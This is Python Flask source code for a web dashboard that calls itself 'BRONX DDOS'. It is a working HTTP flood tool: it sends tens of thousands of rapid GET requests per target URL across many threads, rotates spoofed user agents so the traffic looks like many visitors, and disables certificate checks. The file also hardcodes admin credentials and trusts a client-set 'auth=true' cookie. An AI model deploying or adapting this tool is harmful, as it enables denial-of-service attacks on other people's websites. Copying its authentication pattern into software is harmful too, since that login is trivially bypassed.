from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import urllib3
import os
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_sessions = {}
session_stats = {"success": 0, "failed": 0, "total": 0}
session_logs = []
lifetime_stats = {"success": 0, "failed": 0, "total": 0}

# ✅ MULTI-SESSION POOL - Different User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/537.36",
    "Mozilla/5.0 (Android 14; Mobile) Samsung SM-S24",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) Safari/17.0",
    "Mozilla/5.0 (Linux; Android 13) OnePlus 12",
    "Mozilla/5.0 (iPad; CPU OS 17_0) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0",
]

def create_session(user_agent):
    s = requests.Session()
    s.headers.update({"User-Agent": user_agent})
    return s

SPEEDS = {"slow": 0.5, "normal": 0.2, "fast": 0.05, "turbo": 0.01, "ultra": 0.001}

# ============================================
# CLEAN UI - NO EFFECTS
# ============================================
LOGIN = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX TRAFFIC GEN</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui}
.box{background:#111;padding:40px;border-radius:16px;border:1px solid #333;width:380px;text-align:center}
h1{color:#00ff88;font-size:1.8em;margin-bottom:15px}
input{width:100%;padding:14px;background:#000;border:1px solid #333;border-radius:10px;color:#fff;margin:8px 0;font-size:14px}
.btn{width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px;margin-top:12px}
.btn:hover{box-shadow:0 0 30px rgba(0,255,136,0.3)}
.error{color:#ff4444;margin-top:10px;font-size:12px}
</style></head><body>
<div class="box"><h1>🔬 BRONX DADDOS</h1><p style="color:#888;font-size:0.8em;margin-bottom:15px">Multi-Session Traffic Generator</p>
<form method="post"><input type="text" name="user" placeholder="Username"><input type="password" name="pass" placeholder="Password"><button class="btn" type="submit">ACCESS</button></form>
{% if error %}<p class="error">{{ error }}</p>{% endif %}</div></body></html>"""

DASH = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX TRAFFIC GEN</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#ccc;font-family:system-ui;padding:20px}
.container{max-width:1100px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px;border:1px solid #333;border-radius:14px;margin-bottom:20px;background:#111}
.header h1{color:#00ff88;font-size:1.5em}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
.stat{background:#111;border:1px solid #333;border-radius:12px;padding:18px;text-align:center}
.stat-val{font-size:2em;font-weight:700}.s{color:#00ff88}.f{color:#ff4444}.t{color:#ffd700}
.stat-label{font-size:0.6em;color:#666;text-transform:uppercase;letter-spacing:3px;margin-top:4px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(340px,1fr));gap:16px}
.card{background:#111;border:1px solid #333;border-radius:12px;padding:22px}
.card h3{color:#00ff88;font-size:0.8em;letter-spacing:2px;margin-bottom:14px}
input,select,textarea{width:100%;padding:11px;background:#000;border:1px solid #333;border-radius:8px;color:#fff;margin:4px 0;font-size:13px;font-family:inherit}
input:focus,select:focus,textarea:focus{border-color:#00ff88;outline:none}
label{font-size:0.55em;color:#666;text-transform:uppercase;letter-spacing:2px;display:block;margin-top:8px}
.btn{width:100%;padding:12px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:0.75em;letter-spacing:2px;margin:4px 0}.btn:hover{box-shadow:0 0 25px rgba(0,255,136,0.3)}
.btn-secondary{background:#222;color:#888;border:1px solid #333}.btn-secondary:hover{color:#fff}
.btn-danger{background:rgba(255,0,0,0.15);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-danger:hover{box-shadow:0 0 20px rgba(255,0,0,0.2)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.logs{background:#000;border:1px solid #333;border-radius:10px;padding:14px;max-height:250px;overflow:auto;font-size:0.65em;font-family:monospace;color:#00ff88}
.log-e{padding:3px 0;border-bottom:1px solid #222;color:#888}
.toggle-row{display:flex;align-items:center;gap:12px;margin:8px 0}
.toggle{width:44px;height:24px;background:#333;border-radius:12px;cursor:pointer;position:relative;transition:0.3s}.toggle.on{background:#00ff88}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:22px}
</style></head><body>
<div class="container">
<div class="header"><h1>🔬 BRONX DDOS</h1><a href="/logout" style="color:#ff4444;text-decoration:none;font-size:0.7em">LOGOUT</a></div>
<div class="stats"><div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ Loaded</div></div><div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ Failed</div></div><div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 Total</div></div></div>
<div class="grid">
<div class="card"><h3>🎯 TARGET CONFIG</h3><label>Website/API URLs</label><textarea id="urls" rows="3" placeholder="https://your-api.com&#10;https://your-site.com"></textarea><div class="row"><div><label>Visits per URL</label><input type="number" id="count" value="100"></div><div><label>Speed</label><select id="speed"><option value="slow">Slow</option><option value="normal" selected>Normal</option><option value="fast">Fast</option><option value="turbo">Turbo</option><option value="ultra">Ultra</option></select></div></div>
<div class="toggle-row"><span style="font-size:0.65em;color:#666">Multi-Session Mode</span><div class="toggle on" id="msToggle" onclick="toggleMS()"></div><span id="msLabel" style="font-size:0.65em;color:#00ff88">ON</span></div>
<label>Parallel Sessions (1-20)</label><input type="number" id="msCount" value="5">
<button class="btn" onclick="startTraffic()">▶ START TRAFFIC</button><button class="btn btn-danger" onclick="stopTraffic()">⏹ STOP</button><div id="status" style="margin-top:6px"></div></div>
<div class="card"><h3>📜 LIVE LOGS</h3><div class="logs" id="logs"><div class="log-e">Ready to generate traffic...</div></div></div>
</div>
</div>
<script>
var msOn=true;
function toggleMS(){msOn=!msOn;document.getElementById('msToggle').classList.toggle('on',msOn);document.getElementById('msLabel').textContent=msOn?'ON':'OFF';document.getElementById('msLabel').style.color=msOn?'#00ff88':'#666'}
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
function startTraffic(){var urls=document.getElementById('urls').value.split('\\n').filter(u=>u.trim());var c=document.getElementById('count').value;var s=document.getElementById('speed').value;var sc=document.getElementById('msCount').value;if(urls.length===0)return;fetch('/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls:urls,count:parseInt(c),speed:s,multi:msOn,sessions:parseInt(sc)})}).then(()=>{document.getElementById('status').innerHTML='<span style="color:#00ff88">▶ GENERATING...</span>';l();u()})}
function stopTraffic(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span style="color:#666">Stopped</span>';l()})}
setInterval(()=>{l();u()},2000)
</script></body></html>"""

# ============================================
# ✅ TRAFFIC GENERATOR ENGINE
# ============================================
def visit_url(url, session):
    try:
        resp = session.get(url, timeout=10, verify=False)
        return resp.status_code == 200
    except:
        return False

def traffic_worker(session_id, url, count, delay, num_sessions):
    """Multi-session worker - different User-Agent per session"""
    sessions_list = []
    for i in range(num_sessions):
        ua = random.choice(USER_AGENTS)
        sessions_list.append(create_session(ua))
    
    for i in range(count):
        if session_id not in active_sessions:
            break
        
        session = random.choice(sessions_list)
        success = visit_url(url, session)
        
        with threading.Lock():
            if success:
                session_stats["success"] += 1
                lifetime_stats["success"] += 1
            else:
                session_stats["failed"] += 1
                lifetime_stats["failed"] += 1
            session_stats["total"] += 1
            lifetime_stats["total"] += 1
        
        if i % 25 == 0:
            session_logs.append(f"✅{session_stats['success']} ❌{session_stats['failed']} | {url[:60]}")
        if len(session_logs) > 100:
            session_logs.pop(0)
        
        time.sleep(delay)

def run_traffic(session_id, urls, count, speed, num_sessions):
    delay = SPEEDS.get(speed, 0.2)
    workers = min(num_sessions * len(urls), 50)
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        for url in urls:
            for _ in range(max(1, num_sessions)):
                executor.submit(traffic_worker, session_id, url, count // num_sessions, delay, num_sessions)
    
    if session_id in active_sessions:
        del active_sessions[session_id]

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user') == ADMIN_USER and request.form.get('pass') == ADMIN_PASS:
            return make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
        return render_template_string(LOGIN, error="Invalid credentials")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true':
        return '<script>location.href="/"</script>'
    return DASH

@app.route('/generate', methods=['POST'])
def generate_traffic():
    if request.cookies.get('auth') != 'true':
        return jsonify({"error": "Unauthorized"}), 403
    
    d = request.get_json()
    urls = [u.strip() for u in d.get('urls', []) if u.strip()]
    count = min(int(d.get('count', 100)), 50000)
    speed = d.get('speed', 'normal')
    multi = d.get('multi', True)
    sessions = min(int(d.get('sessions', 5)), 20) if multi else 1
    
    if not urls:
        return jsonify({"error": "URLs required"}), 400
    
    sid = f"traffic_{int(time.time())}"
    active_sessions[sid] = True
    session_logs.append(f"▶ {len(urls)} URL(s) | {count} visits | {sessions} sessions | {speed}")
    
    t = threading.Thread(target=run_traffic, args=(sid, urls, count, speed, sessions))
    t.daemon = True
    t.start()
    
    return jsonify({"status": "started", "sessions": sessions})

@app.route('/stop', methods=['POST'])
def stop_traffic():
    for k in list(active_sessions.keys()):
        del active_sessions[k]
    session_logs.append("⏹ Stopped")
    return jsonify({"status": "stopped"})

@app.route('/logs')
def logs():
    return jsonify({"logs": [f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in session_logs[-30:]]})

@app.route('/stats')
def stats():
    return jsonify({**session_stats, "lt_total": lifetime_stats["total"]})

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
